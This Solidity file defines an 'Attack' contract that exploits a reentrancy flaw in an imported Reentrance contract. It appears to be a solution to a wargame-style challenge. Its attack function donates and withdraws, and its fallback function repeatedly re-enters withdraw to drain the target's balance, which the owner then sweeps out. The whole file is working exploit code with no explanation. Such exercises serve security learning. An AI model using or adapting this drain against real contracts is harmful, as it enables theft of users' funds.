// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./Reentrance.sol";

contract Attack {
    Reentrance public reentrances;
    address public owner;

    constructor() public {
        reentrances = new Reentrance();
        owner = msg.sender;
    }

    function attack() public payable {
        reentrances.donate{value: msg.value}(address(this));
        reentrances.withdraw(1000);
    }

    function withdrawToEOA() public {
        require(msg.sender == owner);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    fallback() external payable {
        if (address(reentrances).balance >= 1000) {
            reentrances.withdraw(1000);
        }
    }
}
